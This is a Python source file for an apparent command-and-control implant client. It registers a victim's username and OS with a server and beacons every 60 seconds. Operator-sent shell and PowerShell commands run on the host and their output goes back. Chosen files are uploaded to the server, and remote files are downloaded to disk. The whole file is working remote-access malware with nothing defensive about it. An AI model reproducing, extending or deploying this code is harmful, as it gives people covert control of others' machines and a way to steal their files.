import requests
import time
import subprocess
import getpass
import os
import re

class C2Client:
    def __init__(self, server_url):
        self.server_url = server_url
        self.key_dir = self.get_key_dir()
        self.key_file_path = os.path.join(self.key_dir, "client_id.txt")
    
        if os.path.exists(self.key_file_path):
            with open(self.key_file_path, "r") as f:
                self.client_id = f.read().strip()
        else:
            os.makedirs(self.key_dir, exist_ok=True)
            self.client_id = ""
    
    def register(self):
        url = f"{self.server_url}/register"
        try:
            username = getpass.getuser()
            payload = {"username": username, "client_id": self.client_id, "op_system": os.name}
            response = requests.post(url, json=payload)
            response_data = response.json()
            
            if "client_id" in response_data:
                self.client_id = response_data.get("client_id")
                
                with open(self.key_file_path, "w") as f:
                    f.write(self.client_id)
                
            print(response_data)
        except Exception:
            raise Exception

    def get_key_dir(self):
        if os.name == 'nt':
            return os.path.join(os.getenv('APPDATA'), "client-prop")
        else:
            return os.path.join(os.path.expanduser("~"), ".config", "client-prop")

    def beacon(self):
        url = f"{self.server_url}/beacon"
        payload = {"client_id": self.client_id}
        
        operations = requests.post(url, json=payload).json()
        self.handle_operations(operations)

    def report(self, status, result):
        url = f"{self.server_url}/report"
        payload = {"client_id": self.client_id, "status": status, "result": result}
        
        response = requests.post(url, json=payload)
        print(response.json())
            
    def handle_operations(self, operations):
        for op in operations:
            resource = op.get("resource")
            match op.get("mode"):
                case "CMD":
                    self.handle_cmd_operation(resource)
                case "IMP":
                    self.handle_imp_operation(resource)
                case "FUP":
                    key = op.get("fup_key")
                    self.handle_fup_operation(resource, key)
                case "FDL":
                    target_dir = op.get("target_dir")
                    execute = op.get("execute")
                    
                    self.handle_fdl_operation(resource, target_dir, execute)

    def handle_cmd_operation(self, command):
        cmd_out = ""
        status = "CMD_SUCCESS"
        try:
            cmd_out = subprocess.getoutput(command)
        except Exception as e:
            status = "ERROR"
            cmd_out = str(e)
            
        self.report(status, cmd_out)
    
    def handle_imp_operation(self, ps_script):
        cmd_out = ""
        status = "PS_SUCCESS"
        try:
            raw_out = subprocess.run(["powershell", "-Command", ps_script], capture_output=True)
            cmd_out = raw_out.stdout.decode("utf-8")
        except Exception as e:
            status = "ERROR"
            cmd_out = str(e)
            
        self.report(status, cmd_out)
    
    def handle_fup_operation(self, file_path, key):
        try:         
            file_path = self.resolve_file_path(file_path)
            if not os.path.exists(file_path):
                print("Target path not found...")
            else:
                url = f"{self.server_url}/upload"
                with open(file_path, "rb") as f:
                    payload = {
                        "status": "SUCCESS",
                        "client_id": self.client_id,
                        "file_name": os.path.basename(file_path),
                        "fup_key": key
                    }
                    requests.post(url, data=payload, files={"file": f})
                
                print("[+] Successfully sent file.")
        except Exception as e:
            print(str(e))
    
    def handle_fdl_operation(self, resource, target_dir, execute):
        try:
            response = requests.get(resource)
            target_dir = self.resolve_file_path(target_dir)
            with open(target_dir, "wb") as f:
                f.write(response.content)
                
            print(f"Downloaded {resource} successfully.")
        except Exception as e:
            print(str(e))
            print(f"Error downloading {resource} on client.")


    def resolve_file_path(self, file_path):
        if "%" in file_path or "$" in file_path:
            if os.name == "nt":
                file_path = self.resolve_windows(file_path)
            else:
                file_path = self.resolve_unix(file_path)
        return file_path

    def resolve_windows(self, file_path):
        def replace_env_windows(match):
            env_var = match.group(1)
            return os.getenv(env_var, "")
        
        return re.sub(r"%([^\s%]+)%", replace_env_windows, file_path)
    
    def resolve_unix(self, file_path):
        def replace_env_unix(match):
            env_var = match.group(1)
            return os.getenv(env_var, "")

        return re.sub(r"\$([a-zA-Z_][a-zA-Z0-9_]*)", replace_env_unix, file_path)

    def run(self):
        self.register()    
        while True:
            self.beacon()
            time.sleep(60) # Timeout before next beacon call

if __name__ == "__main__":
    client = C2Client("http://localhost:9393")
    client.run()